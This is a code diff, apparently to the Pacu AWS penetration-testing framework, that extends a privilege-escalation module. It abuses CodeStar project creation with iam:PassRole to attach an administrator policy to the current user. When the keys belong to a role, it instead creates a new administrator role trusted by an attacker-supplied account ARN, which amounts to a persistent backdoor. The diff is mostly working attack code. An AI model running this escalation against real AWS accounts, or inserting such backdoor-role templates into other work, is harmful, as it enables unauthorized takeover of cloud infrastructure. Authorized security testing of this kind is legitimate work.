@@ -357,6 +357,10 @@ def main(args, pacu_main):
             'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
             'lambda:ListFunctions': False,  # Find existing Lambda functions
             'lambda:InvokeFunction': False  # Invoke it afterwards
+        },
+        'PassExistingRoleToNewCodeStarProject': {
+            'codestar:CreateProject': True,  # Create the CodeStar project
+            'iam:PassRole': True  # Pass the service role to CodeStar
         }
     }
 
@@ -2018,29 +2022,71 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
 
     project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
 
-    codestar_cf_template = {
-        "Resources": {
-            project_name: {
-                "Type": "AWS::IAM::ManagedPolicy",
-                "Properties": {
-                    "ManagedPolicyName": "CodeStar_" + project_name,
-                    "PolicyDocument": {
-                        "Version": "2012-10-17",
-                        "Statement": [
-                            {
-                                "Effect": "Allow",
-                                "Action": "*",
-                                "Resource": "*"
-                            }
+    if active_aws_key.user_name:
+        codestar_cf_template = {
+            "Resources": {
+                project_name: {
+                    "Type": "AWS::IAM::ManagedPolicy",
+                    "Properties": {
+                        "ManagedPolicyName": "CodeStar_" + project_name,
+                        "PolicyDocument": {
+                            "Version": "2012-10-17",
+                            "Statement": [
+                                {
+                                    "Effect": "Allow",
+                                    "Action": "*",
+                                    "Resource": "*"
+                                }
+                            ]
+                        },
+                        "Users": [
+                            active_aws_key.user_name
                         ]
-                    },
-                    "Users": [
-                        active_aws_key.user_name
-                    ]
+                    }
                 }
             }
         }
-    }
+    elif active_aws_key.role_name:
+        attacker_arn = input('Detected the active keys as an IAM role, that means a new IAM role will get created with administrator permissions. What ARN should be trusted in the role\'s trust policy (this should likely be a user/role in your attacker account with the sts:AssumeRole permission)? ').rstrip()
+
+        codestar_cf_template = {
+            "Resources": {
+                project_name: {
+                    "Type": "AWS::IAM::Role",
+                    "Properties": {
+                        "AssumeRolePolicyDocument": {
+                            "Version": "2012-10-17",
+                            "Statement": [
+                                {
+                                    "Effect": "Allow",
+                                    "Principal": {
+                                        "AWS": attacker_arn
+                                    },
+                                    "Action": "sts:AssumeRole"
+                                }
+                            ]
+                        },
+                        "MaxSessionDuration": 43200,
+                        "Policies": [
+                            {
+                                "PolicyName": project_name,
+                                "PolicyDocument": {
+                                    "Version": "2012-10-17",
+                                    "Statement": [
+                                        {
+                                            "Effect": "Allow",
+                                            "Action": "*",
+                                            "Resource": "*"
+                                        }
+                                    ]
+                                }
+                            }
+                        ],
+                        "RoleName": "CodeStarWorker-" + project_name
+                    }
+                }
+            }
+        }
 
     with open('./modules/iam__privesc_scan/PassExistingRoleToNewCodeStarProject/codestar_cf_template.json', 'w+') as f:
         json.dump(codestar_cf_template, f)
@@ -2085,7 +2131,10 @@ def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
             }
         )
 
-        print('Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the project to see where it failed.'.format(project_name, project_name))
+        if active_aws_key.user_name:
+            print('Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the project to see where it failed.'.format(project_name, project_name))
+        elif active_aws_key.role_name:
+            print('Successfully created CodeStar project {}. If everything went correctly, a new role should be created with administrator privileges. From the user/role you supplied the ARN of earlier, use the sts:AssumeRole API to assume access to this administrator role. The role\'s ARN should look like this: "arn:aws:iam::{}:role/CodeStarWorker-{}". If that does not happen soon, you may need to query the project to see where it failed.'.format(project_name, active_aws_key.account_id, project_name))
         return True
     except Exception as error:
         print('Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n'.format(error))
